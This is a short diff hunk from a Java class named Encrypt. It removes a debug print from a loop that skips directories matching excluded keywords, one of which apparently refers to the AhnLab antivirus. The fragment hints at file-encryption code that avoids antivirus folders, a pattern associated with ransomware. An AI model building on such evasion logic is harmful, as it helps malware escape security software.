@@ -78,7 +78,6 @@ public class Encrypt {
 
         for (String keyword : EXCLUDED_KEYWORDS) {
             if (dirPath.toLowerCase().contains(keyword.toLowerCase())) {
-                System.out.println("AntiVirus(Ahnlab) = " + dirPath);
                 return;
             }
         }
